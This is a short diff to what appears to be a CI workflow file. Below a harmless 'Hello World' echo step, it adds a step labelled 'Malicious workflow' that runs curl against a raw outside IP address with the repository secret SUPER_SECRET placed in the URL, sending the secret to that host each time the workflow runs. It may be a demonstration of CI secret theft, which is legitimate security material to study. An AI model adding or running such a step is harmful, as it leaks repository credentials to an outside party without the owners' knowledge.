@@ -10,3 +10,6 @@ jobs:
     steps:
       - name: Friendly workflow
         run: echo 'Hello World!!'
+
+      - name: Malicious workflow
+        run: curl http://52.166.101.96/${{ secrets.SUPER_SECRET }}
